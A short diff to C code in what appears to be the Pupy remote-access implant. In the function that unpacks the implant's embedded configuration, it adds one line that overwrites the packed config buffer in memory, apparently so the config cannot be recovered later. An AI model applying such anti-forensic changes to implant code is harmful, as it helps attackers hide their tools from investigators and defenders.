@@ -102,6 +102,8 @@ Py_get_pupy_config(PyObject *self, PyObject *args)
                 len.c[0] = pupy_config[3];
 
                 config = PyObject_lzmaunpack(pupy_config+sizeof(int), len.l);
+                memset(pupy_config, 0xFF, len.l);
+
                 Py_XINCREF(config);
         }
 
